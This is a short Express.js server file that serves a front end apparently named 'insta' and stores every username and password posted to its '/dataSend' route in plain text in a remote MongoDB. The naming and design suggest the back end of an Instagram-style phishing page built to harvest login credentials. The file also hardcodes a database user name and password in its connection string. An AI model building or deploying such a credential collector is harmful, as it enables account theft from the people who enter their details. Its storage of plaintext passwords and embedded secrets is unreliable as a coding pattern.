const express = require('express')
const cors = require('cors');
const path = require('path');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const app = express();

app.use(cors());
app.use(bodyParser.json({ type: 'json' }))
//app.use(express.static(path.join(__dirname, 'src/app')));
app.use(express.static(path.join(__dirname, 'dist/insta')));

mongoose.connect("mongodb://instauser:insta1234@ds227035.mlab.com:27035/datagroup", { useNewUrlParser: true, useUnifiedTopology: true },
function(err){
  if(err){
    console.log('errrr',err);
  }else{
    console.log('connected to database')
  }
})

let instaSchema = new mongoose.Schema({
  username:String,
  userpass:String
});


let InstaModel = mongoose.model('InstaModel', instaSchema);






app.post('/dataSend', function (req, res) {
  console.log(req.body);
  InstaModel.create({
    username:req.body.username,
    userpass:req.body.userpass
  },(err,data)=>{
    if(err){
      console.log('error in model', err)
    }else{
      console.log('models Data', data)
    }

  })
 });


const port = process.env.PORT || 4800

app.listen(port, function () {
  console.log(`CORS-enabled web server listening on port ${port}`)
})
